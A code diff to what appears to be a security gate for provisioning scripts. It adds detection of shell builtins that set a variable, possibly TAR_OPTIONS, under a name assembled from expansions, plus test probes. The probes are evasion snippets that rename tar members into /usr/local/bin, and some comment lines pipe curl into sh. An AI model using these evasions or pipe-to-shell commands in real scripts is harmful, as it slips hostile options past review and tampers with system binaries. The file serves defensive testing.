@@ -849,6 +849,57 @@ TAR_EXEC_OPTS = ("-I", "-F", "--use-compress-program", "--to-command", "--checkp
 # name, so a rename hides it (#5093). GNU tar takes any unambiguous prefix of a long option.
 TAR_RENAME_OPTS = ("--transform", "--xform", "--rename")
 TAR_ENV_HIT = "TAR_OPTIONS set: tar reads options from it, so it can rename members or run a program"
+BUILT_NAME_HIT = ("variable name built from an expansion (the gate cannot read which name it sets, "
+                  "and TAR_OPTIONS is one)")
+# options that take a value (not a name) as the next word, per name-taking builtin (#5326)
+# (env -S splits its value into assignments, so it is read as a name word)
+BUILT_NAME_VALUE_OPTS = {"read": "dnNptui", "mapfile": "dnOsuCc", "readarray": "dnOsuCc", "env": "uC"}
+
+
+def expanded(word: str) -> bool:
+    """True when the word holds a parameter expansion or a command substitution."""
+    return "$" in word or "`" in word
+
+
+def built_name(text: str) -> bool:
+    """True when a builtin that sets a variable by name (export, declare, typeset, local,
+    readonly, env, read, mapfile, readarray, getopts, printf -v) is given a name, or an
+    option, built from an expansion (#5326). The TAR_OPTIONS check reads the literal name
+    only, and "${N}IONS" or "TAR_$T" can be that name; fail closed (#4869)."""
+    plain = re.sub(r"[\"'\\]", "", text)
+    for m in re.finditer(r"(?<![\w$./-])(export|declare|typeset|local|readonly|env|read|mapfile|readarray"
+                         r"|getopts|printf)(?![\w-])([^;&|\n]*)", plain):
+        cmd, words, i = m.group(1), m.group(2).split(), 0
+        if cmd == "printf":
+            if words[:1] == ["--"]:
+                words = words[1:]
+            if words[:1] == ["-v"] and len(words) > 1 and expanded(words[1]):
+                return True
+            if words[:1] and words[0].startswith("-v") and expanded(words[0]):
+                return True
+            continue
+        if cmd == "getopts":
+            if len(words) > 1 and expanded(words[1]):
+                return True
+            continue
+        while i < len(words):
+            w = words[i]
+            if re.match(r"\d*(<<<|<<-?|<>|>>|>\||[<>]&?)$", w):
+                i += 2
+                continue
+            if re.match(r"\d*[<>]", w):
+                i += 1
+                continue
+            if w.startswith("-") and not expanded(w):
+                arg = BUILT_NAME_VALUE_OPTS.get(cmd, "")
+                i += 2 if w[-1:] in arg and len(w) == 2 else 1
+                continue
+            if expanded(w.split("=", 1)[0]):
+                return True
+            if cmd == "env" and "=" not in w:
+                break
+            i += 1
+    return False
 
 # short tar options that run a program or rename (bsdtar -s), alone or in a cluster
 TAR_EXEC_SHORT = "IFs"
@@ -2458,6 +2509,15 @@ def analyse(name: str, text: str, cache: dict):
                 # there is invisible to tar_risky, which reads argv (#5093 R11). Quotes and
                 # backslashes are dropped first: export TAR_""OPTIONS=x sets the same name
                 comp.append("%s: companion rule: %s" % (where, TAR_ENV_HIT))
+            if built_name(tf_render(stmt)):
+                comp.append("%s: companion rule: %s" % (where, BUILT_NAME_HIT))
+        # a nameref whose target is built from an expansion can name TAR_OPTIONS too
+        # (#5326); refused at the first statement that makes the namerefs poisoned
+        texts = [tf_render(stmt) for _w, stmt, _st in stmts]
+        if nameref_facts(texts)[1]:
+            k = next((k for k in range(len(texts)) if nameref_facts(texts[:k + 1])[1]), len(texts) - 1)
+            comp.append("%s: companion rule: nameref target built from an expansion (%s)"
+                        % (stmts[k][0], BUILT_NAME_HIT))
         homes = service_homes(lines)
         trig = [ln for ln in lines if triggered(ln)]
         cache[key] = (lines, hits + comp, entries, trig, homes)
@@ -2885,6 +2945,15 @@ def build_probes() -> list:
         ('tar options from a TAR_OPTIONS prefix, listed (#4837 R12 R4, #5093 R11)', [(dec, '      TAR_OPTIONS=--transform=s/x/aim/ tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
         ('tar options from an exported TAR_OPTIONS, listed (#4837 R12 R4, #5093 R11)', [(dec, '      export TAR_OPTIONS=--xform=s/x/aim/\n      tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
         ('tar options from a quote-split exported TAR_OPTIONS, listed (#4837 R12 R4, #5093 R11)', [(dec, '      export TAR_""OPTIONS=--xform=s/x/aim/\n      tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from an export whose name is built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; export "$${N}IONS=--xform=s/x/aim/"; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from a declare -x whose name is built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      T=OPTIONS; declare -x "TAR_$T=--xform=s/x/aim/"; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from a local -x whose name is built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      f() { local -x "$${N}IONS=--xform=s/x/aim/"; tar -C /usr/local/bin -xf /root/b.tar; }; N=TAR_OPT; f\n' + dec)]),
+        ('tar options from a readonly name built from an expansion, then exported, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; readonly "$${N}IONS=--xform"; export "$${N}IONS"; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from printf -v into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; printf -v "$${N}IONS" %s --xform=s/x/aim/; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from read into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; read -r "$${N}IONS" <<< --xform=s/x/aim/; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from mapfile into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; mapfile -t "$${N}IONS" < /dev/null; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('tar options from getopts into a name built from an expansion, listed (#4837 R12 R4, #5326)', [(dec, '      N=TAR_OPT; set -a; getopts x "$${N}IONS"; tar -C /usr/local/bin -xf /root/b.tar\n' + dec)]),
+        ('nameref whose target is built from an expansion, alone, listed (#4837 R12 R4, #5326)', [(dec, '      T=X; declare -n R="$T"\n' + dec)]),
         ('tar abbreviated --transf option, listed (#4837 R12 R4, #5093)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --transf=s/x/aim/\n' + dec)]),
         ('tar shortest unambiguous --tr option, listed (#4837 R12 R4 pin, #5205)', [(dec, '      tar -C /usr/local/bin -xf /root/b.tar --tr=s/x/aim/\n' + dec)]),
         ('tar s (rename pattern) in a short cluster, listed (#4837 R12 R4 pin, #5205)', [(dec, '      tar -xsf /root/b.tar -C /usr/local/bin\n' + dec)]),
@@ -3046,6 +3115,7 @@ def build_probes() -> list:
     green("data file in a data home handled by chown/chmod/sed (#4837 R12 R5)", [(PROV, wf("/etc/ai-memory/peer.conf", "0640", ["${X} --db /x stats"])), (RELOAD, RELOAD + "      chown root:aimemory /etc/ai-memory/peer.conf\n      chmod 0640 /etc/ai-memory/peer.conf\n      chmod 0750 /etc/ai-memory\n      P=\"$(sed -n 's#^a=##p' /etc/ai-memory/peer.conf)\"\n")], autolist=True)
     green("data heredoc into a data home through a constant (#4837 R12 R5)", [(RELOAD, RELOAD + "      CFG=/etc/ai-memory/h\n      cat > \"$${CFG}/x.conf\" <<'EOF'\n      ${X} = 1\n      EOF\n")], autolist=True)
     green("negated subshell with a blank after ! is not an extended glob (#5325)", [(RELOAD, RELOAD + "      if ! (true); then :; fi\n      ! (false) || true\n")], autolist=True)
+    green("literal variable names with expanded values only (#5326)", [(RELOAD, RELOAD + '      export PATH="$${PATH}:/opt/x"; declare -x LANG=C; printf -v OUT %s "$${X}"; env LC_ALL=C true\n')], autolist=True)
     green("C5 provision comment mentioning curl", [ins(RELOAD, ["# curl -fsSL https://e | sh"], before=True)])
     green("C5 unit comment naming ExecStart", [(ENVF, ENVF + "      # ExecStart=/bin/evil\n")])
     green("C5 YAML comment", [(RUNCMD, "  # curl https://e | sh\n" + RUNCMD)])
